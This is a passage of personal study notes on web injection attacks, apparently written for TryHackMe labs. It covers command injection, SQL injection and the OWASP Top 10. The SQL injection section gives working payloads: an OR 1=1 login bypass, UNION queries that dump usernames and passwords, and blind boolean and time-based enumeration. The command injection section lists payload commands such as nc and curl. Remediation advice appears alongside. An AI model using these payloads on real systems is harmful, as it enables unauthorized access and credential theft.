+<p>Learn more Injection <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html"  class="external-link" target="_blank" rel="noopener">Here</a></p>
+<h3 id="email-injection">
+  Email Injection
+  <a class="heading-link" href="#email-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Allow malicious user to send email messages without prior authorization by the email server, usually occurs by adding extra data to field.</p>
+<h3 id="command-injection">
+  Command Injection
+  <a class="heading-link" href="#command-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>AKA Remote Code Execution (RCE), remotely execute the command within an application</li>
+<li>Abuse of an <strong>application</strong>&rsquo;s behaviour <strong>to execute command</strong> on the operating system</li>
+<li>e.g. Obtain &ldquo;Joe&rdquo;&rsquo;s user permission, and run command under Joe and obtain any permission that Joe has.</li>
+<li><a href="https://github.com/payloadbox/command-injection-payload-list"  class="external-link" target="_blank" rel="noopener"><strong>Command Injection Cheat Sheet</strong></a></li>
+<li><strong>Discover</strong> : Takes the user input $title as part of the command request, takes this as advantages and inject command:
+<img src="4.png" alt="CommandInjection.png"></li>
+<li><strong>Exploiting</strong>: This is usually an unintended behaviour. Look for the behaviour of the application. Watch out for <code>;</code>,<code>&amp;</code> and <code>&amp;&amp;</code> for command behaviour.
+<ul>
+<li>Can be detected in two way:
+<ul>
+<li>blind command injection:
+<ul>
+<li>use payload that can cause time delay such as <code>ping</code> or <code>sleep</code> for linux, <code>timeout</code> for Windows.</li>
+<li>forcing some input using redirection operato <code>&gt;</code></li>
+<li>use <code>curl</code> command to test for command injection: deliver data to and from an application in the payload</li>
+</ul>
+</li>
+<li>verbose command injection: gives feedback</li>
+</ul>
+</li>
+<li>Useful payload:
+<ul>
+<li>Linux: <code>whoami</code>, <code>ls</code>, <code>ping</code>, <code>sleep</code>, <code>nc</code></li>
+<li>Windows: <code>whoami</code>, <code>dir</code>, <code>ping</code>, <code>timeout</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Remediating</strong>:
+<ul>
+<li>Input <em>sanitisation</em>: specifying the format/type of data that a user can submit or remove special character <code>&gt;</code>, <code>&amp;</code> and <code>/</code>.</li>
+<li><em>Bypassing</em> filters: restrict to specific payloads
+<ul>
+<li>application may stripped out a quotation mark, the input can bypass it using hexadecimal value</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="sql-injection-sqli">
+  SQL Injection (SQLi)
+  <a class="heading-link" href="#sql-injection-sqli">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Easily to test out with <code>' or 1=1--</code>, some uses <code>' or 1=1;--</code></li>
+<li>Structured Query Language</li>
+<li>indicated by adding <code>'</code> at the end of HTTP request to confirm if vulnerable to SQLi, (positive vulnerability if returned server internal error)</li>
+<li>When user provided data gets included in the SQL query</li>
+<li>Example injection:
+<ul>
+<li><code>https://website.thm/blog?id=1</code>, <code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></li>
+<li><code>https://website.thm/blog?id=2;--</code>, <code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code>, return whose id=0 wheither it is public or not.</li>
+<li>*<code>--</code> cause everything after ward treated as comment</li>
+</ul>
+</li>
+<li>similar to peeling an onion, use the existing information, step by step, building the the target command with the heavy use of <code>information_schema</code> (which contain all the information in the database)</li>
+<li><strong>Three type of Injection</strong>:
+<ul>
+<li><strong>In-Band SQLi</strong>:
+<ul>
+<li>The easiest type of SQLi: Use the same method of communication being used to exploit the vulnerability and also receiving result.
+<ul>
+<li>Error-Based SQLi: intentionally trigger an error message to obtain information about a database. Commontly being explored using <code>'</code> or <code>&quot;</code>.</li>
+<li>Uses the UNION command along with select to return additional result to the page</li>
+</ul>
+</li>
+<li><code>information_schema</code> contain all the important information and every user has access to it</li>
+<li>Example command:
+<ol>
+<li><code>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</code></li>
+<li><code>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code></li>
+<li><code>0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</code></li>
+</ol>
+</li>
+</ul>
+</li>
+<li><strong>Blind SQLi</strong>:
+<ul>
+<li><strong>Authentication Bypass</strong>: based on the database providing a <strong>boolean answer of true/false</strong> for the user &amp; password matches.
+<ul>
+<li>e.g. Database use this to check login: <code>select * from users where username='%username%' and password='%password%' LIMIT 1;</code>, enter <code>' OR 1=1;--</code> in the field to bypass it.</li>
+</ul>
+</li>
+<li><strong>Boolean Based</strong>: use the reflected boolean field to confirm the structure of a database. (By intentionally SQL a false boolean and add other queries to confirm the added aspects exists.)
+<ul>
+<li>Example:
+<ol>
+<li>determe how many column in this table: <code>admin123' UNION SELECT 1,2,3;--</code></li>
+<li>determe what is the database name: <code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code></li>
+<li>determine table name in this database using information_schema <code>admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='u%';--</code></li>
+<li>determine clumn name in this table: <code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';--</code></li>
+<li>determine username: <code>admin123' UNION SELECT 1,2,3 from users where username like 'a%</code></li>
+<li>determine password: <code>admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%</code></li>
+<li>FULL behind the scene statement: <code>select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--' LIMIT 1 </code></li>
+</ol>
+</li>
+</ul>
+</li>
+<li><strong>Time Based</strong>: Similar to Boolean Based, but without true/false indication. The indicator of a correct query is based on the <strong>time query</strong> using the build-in method Sleep(x) (sleep() gets executed when success)
+<ul>
+<li>URL statement (starts after referrer): <code>https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from information_schema.columns where table_schema='sqli_four' and table_name='analytics_referrers' and column_name != 'domain' and column_name != 'id' and column_name like '%';--</code></li>
+<li>FULL statement behind the scene: <code>select * from analytics_referrers where domain='admin123' UNION SELECT SLEEP(2),2 from information_schema.columns where table_schema='sqli_four' and table_name='analytics_referrers' and column_name != 'domain' and column_name != 'id' and column_name like '%';--' LIMIT 1 </code></li>
+</ul>
+</li>
+<li><strong>Out-of-Band SQLi</strong>: Depends on the feature enabled on the database server
+<ul>
+<li>Have two different communication channel, one for the attack and the other for collecting the result: sending payload to the website, website sends the request to the server and force the server to send back the result to the hacker&rsquo;s machine</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Remediation</strong>:
+<ul>
+<li><strong>Prepared Statement</strong>: Adding input as parameter; database can distinguish between query and data</li>
+<li><strong>Input Validation</strong>: restrict input to only certain strings/filter the characters</li>
+<li><strong>Escaping User Input</strong>: escaping user input is a method of prepending (\) to these characters and cause them to be parsed as a regular string instead of special character.</li>
+</ul>
+</li>
+<li><strong>SQL knowledge</strong>: Relational Vs Non-Relational Databases:
+<ul>
+<li>Relational: stores information in tables and each key can be repurposed to other tables</li>
+<li>Non-relational: AKA NoSQL, database that doesn&rsquo;t use tables to store data. Hence gives a higher flexibility: e.g. MongoDB, Cassandra and ElasticSearch</li>
+<li>Example SQL command:
+<ul>
+<li><code>select * from users where username='admin' or username='jon';</code></li>
+<li><code>select * from users where username like '%mi%';</code></li>
+<li><code>SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</code></li>
+<li><code>insert into users (username,password) values ('bob','password123');</code></li>
+<li><code>update users SET username='root',password='pass123' where username='admin';</code></li>
+<li><code>delete from users where username='martin';</code></li>
+<li><code>delete from users;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="owasp">
+  OWASP
+  <a class="heading-link" href="#owasp">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="1-broken-access-control">
+  1. Broken Access Control
+  <a class="heading-link" href="#1-broken-access-control">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Website visitor are allow to see the pages that they are not allowed.
+-&gt; Bypass authorization</p>
+<h2 id="2-cryptographic-failures">
+  2. Cryptographic Failures
+  <a class="heading-link" href="#2-cryptographic-failures">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Bad use of encryption
+-&gt; Transparent data flow</p>
+<h2 id="3-injection">
+  3. Injection
+  <a class="heading-link" href="#3-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>SQL injection
+Command injection
+-&gt; add private stuff to have the system spit the target info</p>
+<h2 id="4-insecure-design">
+  4. Insecure Design
+  <a class="heading-link" href="#4-insecure-design">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Insecure design and insecure password resets
+Vulnerability which are inherent to the application&rsquo;s architecture
+The idea of whole application is flawed from the start
+-&gt; Design flaw</p>
+<h2 id="5-security-misconfiguration">
+  5. Security Misconfiguration
+  <a class="heading-link" href="#5-security-misconfiguration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>As the name suggest, poorly configured server/service lead to security risks. Poorly managed service include permission, unecessary feature, default account and password, error message overly detailed, HTTP security headers
+-&gt; initial configuration &amp; Human flaw</p>
+<h2 id="6-vulnerable-and-outdated-components">
+  6. Vulnerable and Outdated Components
+  <a class="heading-link" href="#6-vulnerable-and-outdated-components">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Unupdated version of software with their CVE easily found in database.
+-&gt; Past vulnerability are saved online on repository with full solution, go look for them</p>
+<h2 id="7-identification-and-authentication-failures">
+  7. Identification and Authentication Failures
+  <a class="heading-link" href="#7-identification-and-authentication-failures">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Playing with authentication system
+-&gt; play with username &amp; password or session cookies (or cookies)</p>
+<h2 id="8-software-and-data-integrity-failures">
+  8. Software and Data Integrity Failures
+  <a class="heading-link" href="#8-software-and-data-integrity-failures">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Integrity is secured with a hash
+-&gt; no third party integrity check before usage of scripts
+Third party script integrity problem can be solved using <a href="https://www.srihash.org/"  class="external-link" target="_blank" rel="noopener">SRI</a></p>
+<h2 id="9-security-logging--monitoring-failures">
+  9. Security Logging &amp; Monitoring Failures
+  <a class="heading-link" href="#9-security-logging--monitoring-failures">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>-&gt; Log files tells everything</p>
+<h2 id="10-server-side-request-forgery-ssrf">
+  10. Server-Side Request Forgery (SSRF)
+  <a class="heading-link" href="#10-server-side-request-forgery-ssrf">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Ask server to send resquest to attackers controlled server. They often arises with third party services.
+server-side: the server + request: sends GET/POST request + forgery: inappropriate request = server send forgered request.</p>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2025 -
+    
+    2026
+     Rain Ou 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/rainou/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
